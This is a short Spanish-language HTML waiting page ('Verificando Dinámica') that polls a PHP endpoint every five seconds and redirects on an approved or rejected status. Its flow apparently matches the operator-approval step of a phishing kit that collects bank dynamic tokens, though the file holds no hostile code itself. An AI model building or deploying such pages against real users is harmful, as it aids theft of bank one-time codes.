<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificando Dinámica…</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #2b2a28;
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
    }

    .loader {
      max-width: 300px;
      width: 100%;
      text-align: center;
    }

    .logo {
      width: 180px;
      margin-bottom: 30px;
      animation: fadeIn 1.5s ease-in-out infinite alternate;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #FFD700;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px auto;
    }

    .loading-text {
      font-size: 16px;
      font-weight: 300;
      opacity: 0.9;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    @keyframes fadeIn {
      from {
        opacity: 0.7;
      }
      to {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div class="loader">
    <img class="logo" src="logo.svg" alt="Logo">
    <div class="spinner"></div>
    <div class="loading-text">Verificando, por favor espera…</div>
  </div>

  <script>
const params = new URLSearchParams(location.search);
const id = params.get('id');
if (!id) {
  location.href = 'dinamica.html';
    }

    async function check() {
      try {
        const res = await fetch(`verificar_dinamica.php?id=${id}`);
        const j = await res.json();
        if (j.status === 'din_aprobado') {
          location.href = 'Dashboard.html';
        } else if (j.status === 'din_rechazado') {
          alert('Dinámica incorrecta. Intenta de nuevo.');
          location.href = `dinamica.html?id=${id}`;
        }
      } catch (error) {
        console.error('Error al verificar:', error);
      }
    }

    check();
    setInterval(check, 5000);
  </script>
</body>
</html>
